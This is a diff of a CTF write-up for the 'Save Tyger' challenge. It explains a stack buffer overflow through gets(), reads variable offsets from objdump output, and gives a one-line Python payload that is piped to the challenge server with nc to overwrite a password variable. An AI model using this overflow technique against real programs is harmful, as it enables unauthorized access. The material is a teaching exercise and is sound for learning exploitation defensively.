@@ -6,11 +6,11 @@ Can you save our one and only Tyger?
 <br>
 Connect with `nc litctf.live 31786`
 
-[save_tyger.zip](https://drive.google.com/uc?export=download&id=1ePTPwUBKcNLESM2ev1IZEb3kL4SeTcn1)
+[`save_tyger.zip`](https://drive.google.com/file/d/1ePTPwUBKcNLESM2ev1IZEb3kL4SeTcn1/view)
 
 ## Solution
 
-We're given a C file (and an executable):
+We're given a C file (and the corresponding executable). Via the `nc` terminal command, we interact with a running instance of the program and have to exploit it somehow:
 ```c
 #include <stdlib.h>
 #include <stdio.h>
@@ -39,7 +39,7 @@ int main(){
 ```
 This is a classic problem.
 
-We need to somehow overwrite `pass`. Note the usage of `gets` for input, which lets us write arbitrarily many characters, so we can overflow `buf` into `pass`. We now look in the executable (`objdump -d`) for where `buf` and `pass` are stored:
+We need to somehow overwrite `pass`. Note the usage of `gets()` for input, which lets us write arbitrarily many characters, so we can overflow `buf` into `pass`. We now look in the executable (`objdump -d`) for where `buf` and `pass` are stored:
 ```
 00000000000011c9 <main>:
     11c9:	f3 0f 1e fa          	endbr64 
@@ -56,7 +56,10 @@ We need to somehow overwrite `pass`. Note the usage of `gets` for input, which l
     11f9:	48 89 c7             	mov    %rax,%rdi <- argument to gets (buf)
     11fc:	b8 00 00 00 00       	mov    $0x0,%eax
     1201:	e8 aa fe ff ff       	callq  10b0 <gets@plt>
+...
 ```
+The assignment `pass = 0` is converted into a `movq` (**mov**e **q**uadword (64-bit)) instruction, copying the literal `$0x0` into address `-0x8(%rbp)`. For the call to `gets()`, note by calling conventions that the register `%rdi` stores the first argument. Its value was copied from `%rax`, which was stored the address (not the address's value) `-0x30(%rbp)` via `lea` (**l**oad **e**ffective **a**ddress).
+
 `pass` is at stack frame (`%rbp`) minus `0x8`, while `buf` is at minus `0x30`.
 That means they're a distance of `0x30 - 0x8 = `40 bytes apart,
 so we need to send 40 junk characters, and then `ab aa ad ab` (little-endian).
@@ -64,7 +67,7 @@ We write code to produce the string, converting the hex representation of the by
 ```py
 print("a"*40+"abaaadab".decode("hex"))
 ```
-Pipe the output into the netcat command, and we get our flag.
+Pipe the output into the netcat command (`python script.py | nc ...` or `nc ... < output.txt`), and we get our flag.
 
 ## Flag
 
